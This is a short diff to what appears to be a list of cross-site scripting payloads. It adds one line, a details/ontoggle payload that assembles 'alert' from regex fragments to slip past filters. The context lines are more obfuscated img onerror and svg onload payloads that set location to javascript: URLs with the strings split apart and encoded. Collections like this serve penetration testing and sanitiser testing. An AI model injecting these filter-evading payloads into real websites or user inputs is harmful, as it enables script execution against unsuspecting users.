@@ -16,6 +16,7 @@ windiow
   
   
 <img src=1 onerror=location="javascript:alert(1)">
+  <details open ontoggle=top[/al/.source+/ert/.source](8);>
 <svg/onload=location=`javas`%2b`cript:ale`%2b`rt%2`%2b`81%2`%2b`9` >
 <img src="1" onerror=location="javascript:aler"%2b"t%2"%2b"81%2"%2b"9">
 <img src=1 onerror=a="%2",location="javascript:aler"%2b"t"%2ba%2b"81"%2ba%2b"9">
